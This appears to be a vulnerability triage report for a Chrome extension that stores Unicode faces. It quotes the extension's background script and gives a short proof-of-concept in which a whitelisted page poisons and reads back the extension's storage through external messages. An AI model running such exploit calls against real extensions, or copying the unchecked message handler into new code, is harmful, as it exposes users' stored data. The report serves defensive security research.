# CoCo Analysis: gmjdaaahidcimfaipifeoekglllgdllb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (multiple duplicate traces)

---

## Sink: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gmjdaaahidcimfaipifeoekglllgdllb/opgen_generated_files/bg.js
Line 986: `faces.push({"0": "(ʘ ͜ʖ ʘ)"});`
Line 1000: `faces.push(face);`

**Code:**

```javascript
// Background script (bg.js:963+)
var faces = [];

// readFaces function reads from chrome.storage.sync
var readFaces = function() {
    faces = [];

    chrome.storage.sync.get("count", function(item) {
        if (isEmpty(item)) {
            chrome.storage.sync.set({"count": 1});
            chrome.storage.sync.set({"0": "(ʘ ͜ʖ ʘ)"});
            faces.push({"0": "(ʘ ͜ʖ ʘ)"});
            count = 1;
            return;
        }

        count = item.count;

        if (count === 0) return;

        for (index = 0; index < count; index++) {
            chrome.storage.sync.get(index.toString(), function(face) { // ← storage read
                if (!isEmpty(face)) {
                    faces.push(face); // ← stored data flows to faces array
                }
            });
        }
    });
};

// chrome.runtime.onMessageExternal listener (bg.js:1017-1042)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.message === "get") {
        readFaces(); // Reads from storage into faces array
        setTimeout(function() {
            sendResponse({data: faces}) // ← sends stored data back to external caller
        }, 50);
    }
    else if (request.message === "add") {
        item = {};
        item[count.toString()] = request.data; // ← attacker-controlled data
        chrome.storage.sync.set(item); // ← attacker can poison storage
        count += 1;
        chrome.storage.sync.set({"count": count});
        sendResponse({message: "ok"});
    }

    return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any website matching externally_connectable whitelist
// (*://chat.stackexchange.com/rooms/*)

// Step 1: Poison storage with attacker data
chrome.runtime.sendMessage(
    'gmjdaaahidcimfaipifeoekglllgdllb', // extension ID
    {message: "add", data: "attacker-controlled-face-data"},
    function(response) {
        console.log("Poisoned storage:", response);
    }
);

// Step 2: Retrieve all stored faces (information disclosure)
chrome.runtime.sendMessage(
    'gmjdaaahidcimfaipifeoekglllgdllb',
    {message: "get"},
    function(response) {
        console.log("Leaked stored faces:", response.data);
        // Attacker receives all user's stored Unicode faces
    }
);
```

**Impact:** Complete storage exploitation chain. A malicious website matching the externally_connectable whitelist (*://chat.stackexchange.com/rooms/*) can: (1) poison chrome.storage.sync by adding arbitrary face data via the "add" message handler, and (2) retrieve all stored face data via the "get" message handler which calls readFaces() and sends back the faces array via sendResponse({data: faces}). This achieves both storage poisoning with retrieval path (complete chain), and information disclosure of user's stored Unicode faces. The extension has the required "storage" permission in manifest.json.

---
